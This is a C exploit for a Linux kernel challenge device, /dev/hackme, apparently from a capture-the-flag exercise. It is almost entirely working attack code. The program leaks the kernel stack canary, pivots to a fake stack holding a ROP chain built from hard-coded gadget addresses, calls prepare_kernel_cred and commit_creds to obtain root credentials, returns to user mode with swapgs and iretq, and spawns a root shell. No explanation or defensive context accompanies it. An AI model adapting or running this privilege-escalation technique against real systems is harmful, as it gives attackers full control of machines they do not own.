#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <errno.h>	
/*
0xffffffff814c6410 T commit_creds 
0xffffffff814c67f0 T prepare_kernel_cred 
0xffffffff823d6b02: cmp rdi, 0xffffff; ret;
0xffffffff8166fea3: mov rdi, rax; jne 0x86fe73; pop rbx; pop rbp; ret; 
0xffffffff8166ff23: mov rdi, rax; jne 0x86fef3; pop rbx; pop rbp; ret;
0xffffffff81006370: pop rdi; ret;
0xffffffff8100a55f: swapgs; pop rbp; ret; 
0xffffffff818c6b35: add rsi, 1; cmp rsi, rdi; jne 0xac6b30; pop rbp; ret; 
0xffffffff814381cb: iretq; pop rbp; ret;
0xffffffff8150b97e: pop rsi; ret;
0xffffffff818fa3ef: xor rax, rdx; pop rbp; ret;
0xffffffff810062dc: mov rsp, rbp; pop rbp; ret;
*/

unsigned long user_cs, user_ss, user_sp, user_rflags;
void save_state()
{
	__asm(
		".intel_syntax noprefix;"
		"mov user_cs, cs;"
		"mov user_ss, ss;"
		"mov user_sp, rsp;"
		"pushf;"
		"pop user_rflags;"
		".att_syntax;"
	);
	printf("***save state***");
	printf("user_cs:0x%lx\n", user_cs);
	printf("user_ss:0x%lx\n", user_ss);
	printf("user_sp:%0x%lx\n", user_sp);
	printf("user_rflags:%0xlx\n", user_rflags);
	printf("***save finish***");
}

void backdoor()
{
	printf("****getshell****");
	system("id");
	system("/bin/sh");
}
unsigned long *fake_stack;
void build_fake_stack()
{
	
	fake_stack = mmap((void *)0x20000 - 0x1000, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS| MAP_FIXED | MAP_PRIVATE, -1, 0);
	if (fake_stack == MAP_FAILED)
		perror("mmap");
	unsigned int offset = 0x1000 / 8;
	fake_stack[0] = 0xcdef;
	//iretq RIP|CS|RFLAGS|SP|SS
	fake_stack[offset++] = 0;
	fake_stack[offset++] = 0xffffffff81006370; //pop_rdi_ret
	fake_stack[offset++] = 0;
	fake_stack[offset++] = 0xffffffff814c67f0; //prepare_kernel_cred
	fake_stack[offset++] = 0xffffffff8150b97e; //pop_rsi_ret
	fake_stack[offset++] = 0;
	fake_stack[offset++] = 0xffffffff81006370; //pop_rdi_ret
	fake_stack[offset++] = 1;
	fake_stack[offset++] = 0xffffffff818c6b35; //add rsi, 1; cmp rsi, rdi; jne 0xac6b30; pop rbp; ret; 
	fake_stack[offset++] = 0;
	fake_stack[offset++] = 0xffffffff8166fea3; //mov rdi, rax; jne 0x86fe73; pop rbx; pop rbp; ret; 
	fake_stack[offset++] = 0;
	fake_stack[offset++] = 0;
	fake_stack[offset++] = 0xffffffff814c6410; //commit_creds;
	fake_stack[offset++] = 0xffffffff8100a55f; //swapgs; pop rbp; ret; 
	fake_stack[offset++] = 0;
	fake_stack[offset++] = 0xffffffff814381cb; //iretq; pop rbp; ret;
	fake_stack[offset++] = (unsigned long)backdoor;
	fake_stack[offset++] = user_cs;
	fake_stack[offset++] = user_rflags;
	fake_stack[offset++] = user_sp;
	fake_stack[offset++] = user_ss;
}

int main()
{	
	save_state();
	build_fake_stack();	
	int fd = open("/dev/hackme", O_RDWR);
	unsigned long buf[256];
	read(fd, buf, 11 * 8);
	for(int i = 0; i < 11; i++)
		printf("i:%d\taddress:0x%lx\n", i, buf[i]);
	unsigned long payload[256];
	unsigned int index = 0;
	for(int i = 0; i < (16); i ++)
		payload[index++] = 0;
	unsigned long canary = buf[2];
	payload[index++] = canary;
	payload[index++] = 0;
	payload[index++] = 0;
	payload[index++] = 0;
	payload[index++] = 0xffffffff818fa3ef; //xor rax, rdx; pop rbp; ret;
	payload[index++] = 0x20000;
	payload[index++] = 0xffffffff810062dc; //mov rsp, rbp; pop rbp; ret;
	payload[index++] = 0;
	write(fd, payload, index * 8);
}
